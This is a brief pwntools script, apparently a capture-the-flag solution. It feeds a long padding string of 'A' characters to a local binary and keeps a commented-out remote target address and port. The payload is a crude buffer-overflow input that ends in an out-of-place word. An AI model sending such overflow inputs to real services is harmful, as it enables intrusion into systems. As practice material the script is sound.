from pwn import *

p = process("1")
#p = remote('52.184.85.16', 12345)
#p.sendline("13523023")
#p.sendline("2")

payload = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAobjectionably"

p.sendline(payload) 
p.interactive()